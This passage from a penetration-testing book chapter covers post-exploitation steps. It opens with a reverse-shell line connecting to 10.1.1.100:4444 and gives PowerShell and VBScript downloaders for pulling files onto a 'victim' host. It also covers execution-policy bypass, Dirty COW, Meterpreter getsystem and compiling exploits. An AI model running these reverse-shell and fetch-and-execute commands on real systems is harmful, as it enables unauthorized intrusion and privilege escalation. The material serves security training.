pc = rt.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.1.1.100/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
pc.waitFor()</pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Privilege escalation</h1>
                </header>
            
            <article>
                
<p><span>After exploiting a vulnerability, most of the time, you will get a limited shell. The next step is to get an admin account on the victim machine. To accomplish this, you will need to choose one of the following methodologies:</span></p>
<ul>
<li>Transfer a file to the victim machine to allow you to have a root shell (for example, Dirty COW)</li>
<li>Copy–pasting a PowerShell payload for Windows OS (for example, Empire PowerShell)</li>
<li>Using Metasploit/Meterpreter to escalate the privileges (refer to <em>Appendix B</em>)</li>
<li>Manually searching for misconfigured parameters in order to get an admin/root shell</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">File transfers</h1>
                </header>
            
            <article>
                
<p>Let's look at a practical scenario. Say you just got a limited shell into the victim's machine. You know that the OS is Linux and you want to upload <kbd>Dirty COW</kbd> <span>to the remote server  to execute it. Here are the steps for this method:</span></p>
<ol>
<li>Copy the <kbd>Dirty COW</kbd> binary into the target HTTP directory located at <kbd>/var/www/html</kbd>.</li>
<li>Start the web server using <kbd>$service apache2 start</kbd>.</li>
<li>Download the file to the victim's machine through the limited shell using the following commands (I will download the file into the <kbd>/tmp</kbd> directory):
<ul>
<li><kbd>cd /tmp</kbd></li>
<li><kbd>$wget [http://Kali IP Address/filename]</kbd></li>
</ul>
</li>
</ol>
<p>But what if I want to transfer a file to a Windows machine? For this, I need to use PowerShell, as shown in the following section.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using PowerShell</h1>
                </header>
            
            <article>
                
<p>Execute the following commands in your limited shell to create the script:</p>
<pre><strong>echo $storageDir = $pwd &gt; wget_win.ps1</strong><br/><strong>echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget_win.ps1</strong><br/><strong>echo $url = "http://[kali IP]/file name" &gt;&gt;wget_win.ps1</strong><br/><strong>echo $file = "get-admin.exe" &gt;&gt;wget_win.ps1</strong><br/><strong>echo $webclient.DownloadFile($url,$file) &gt;&gt;wget_win.ps1</strong></pre>
<p><span>I've chosen the filename <kbd>get-admin.exe</kbd>. You don't have to use the same name; you can use any name you like.</span></p>
<p>Next, execute the script using <kbd>powershell.exe</kbd>:</p>
<pre><strong><span>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget_win.ps1</span></strong></pre>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Using VBScript</h1>
                </header>
            
            <article>
                
<p>For older versions of Windows with no PowerShell, we will use VBScript. The first step is to create the script. Then, we can execute it using the <kbd>cscript</kbd> command:</p>
<pre><strong>echo strUrl = WScript.Arguments.Item(0) &gt; wget_win.vbs</strong><br/><strong>echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget_win.vbs</strong><br/><strong>echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget_win.vbs</strong><br/><strong>echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget_win.vbs</strong><br/><strong>echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget_win.vbs</strong><br/><strong>echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget_win.vbs</strong><br/><strong>echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget_win.vbs</strong><br/><strong>echo Err.Clear &gt;&gt; wget_win.vbs</strong><br/><strong>echo Set http = Nothing &gt;&gt; wget_win.vbs</strong><br/><strong>echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget_win.vbs</strong><br/><strong>echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget_win.vbs</strong><br/><strong>echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget_win.vbs</strong><br/><strong>echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget_win.vbs</strong><br/><strong>echo http.Open "GET", strURL, False &gt;&gt; wget_win.vbs</strong><br/><strong>echo http.Send &gt;&gt; wget_win.vbs</strong><br/><strong>echo varByteArray = http.ResponseBody &gt;&gt; wget_win.vbs</strong><br/><strong>echo Set http = Nothing &gt;&gt; wget_win.vbs</strong><br/><strong>echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget_win.vbs</strong><br/><strong>echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget_win.vbs</strong><br/><strong>echo strData = "" &gt;&gt; wget_win.vbs</strong><br/><strong>echo strBuffer = "" &gt;&gt; wget_win.vbs</strong><br/><strong>echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget_win.vbs</strong><br/><strong>echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget_win.vbs</strong><br/><strong>echo Next &gt;&gt; wget_win.vbs</strong><br/><strong>echo ts.Close &gt;&gt; wget_win.vbs</strong></pre>
<p>Execute the <kbd>wget_win.vbs</kbd> <span>script</span><span>:</span></p>
<pre><span>cscript wget_win.vbs http://[Kali IP address]/[File Name] get-admin.exe</span></pre>
<p><span>I've chosen the filename <kbd>get-admin.exe</kbd>. You don't have to use the same name; you can use any name you like.</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Administrator or root</h1>
                </header>
            
            <article>
                
<p>Typing all these commands is time consuming. The best way to go through this process faster is to upload a scripted file to your victim's machine using the methods described in the previous section, <em>File transfers</em>. The best script out there on the web can be downloaded from the following GitHub repositories:</p>
<ul>
<li><strong>For Windows</strong>: <a href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></li>
<li><strong>For Linux</strong>: <a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></li>
</ul>
<p>If you're using Metasploit and you have a Meterpreter session, then use the following command to elevate your privileges:</p>
<pre><strong><span>meterpreter &gt; getsystem</span></strong></pre>
<div class="packt_infobox">Refer to <em>Appendix B</em> for a complete guide to Metasploit/Meterpreter privilege escalation.</div>
<div class="packt_tip">
<p>Windows privilege escalation exploits are often written in Python. You can download <kbd>pyinstaller.py</kbd> to convert the exploit into an executable and upload it to the remote server—for example:</p>
<ul>
<li><strong>Install PyInstaller</strong>: <kbd>$pip install pyinstaller</kbd></li>
<li><strong>Download your exploit</strong>: <kbd>$wget http://[exploit URL]</kbd></li>
<li><strong>Convert it</strong>: <kbd>$python pyinstaller.py --onefile [python file.py]</kbd></li>
</ul>
<p><span>Some exploits are written in the C language. To compile C language binaries, execute the following:</span></p>
<p><kbd>$gcc -o [outfile name] [original binary.c]</kbd></p>
</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>So many topics were covered in this chapter, from information gathering to privilege escalation. I tried to cover the most important ones and then get straight to the point without the nitty-gritty details in order to maximize the topics I could cover in a single chapter.</p>
<p>What you learned in this chapter is just half the story regarding penetration testing. In fact, in this chapter, we just covered network-based assessment. In the next chapter, we will cover web-application-based penetration testing.</p>


            </article>

            
        </section>
    </div>



  </body></html>